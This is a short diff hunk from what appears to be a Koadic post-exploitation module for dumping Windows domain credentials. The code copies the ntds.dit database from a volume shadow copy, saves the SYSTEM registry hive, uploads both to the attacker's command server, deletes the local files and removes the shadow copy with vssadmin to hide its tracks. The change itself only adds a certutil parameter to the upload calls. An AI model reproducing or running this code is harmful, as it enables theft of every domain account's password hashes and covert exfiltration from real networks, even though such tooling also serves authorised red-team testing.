@@ -13,12 +13,12 @@ try {
 
     //Koadic.shell.run("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, false);
     var unused = Koadic.shell.exec("copy " + shadow + "\\windows\\ntds\\ntds.dit " + ntds_path, "~RPATH~\\~NTDSFILE~2.txt");
-    Koadic.http.upload(ntds_path, "~NTDSFILE~", "~UUIDHEADER~");
+    Koadic.http.upload(ntds_path, "~NTDSFILE~", ~CERTUTIL~, "~UUIDHEADER~");
     Koadic.file.deleteFile(ntds_path);
 
     // step 2. create, send SYSTEM hive, delete
     Koadic.shell.run("reg save HKLM\\SYSTEM " + sysh_path + " /y", false);
-    Koadic.http.upload(sysh_path, "~SYSHFILE~", "~UUIDHEADER~");
+    Koadic.http.upload(sysh_path, "~SYSHFILE~", ~CERTUTIL~, "~UUIDHEADER~");
     Koadic.file.deleteFile(sysh_path);
     var discard = Koadic.shell.exec("vssadmin delete shadows /shadow="+shadowid+" /quiet", "~RPATH~\\"+Koadic.uuid()+".txt");
 
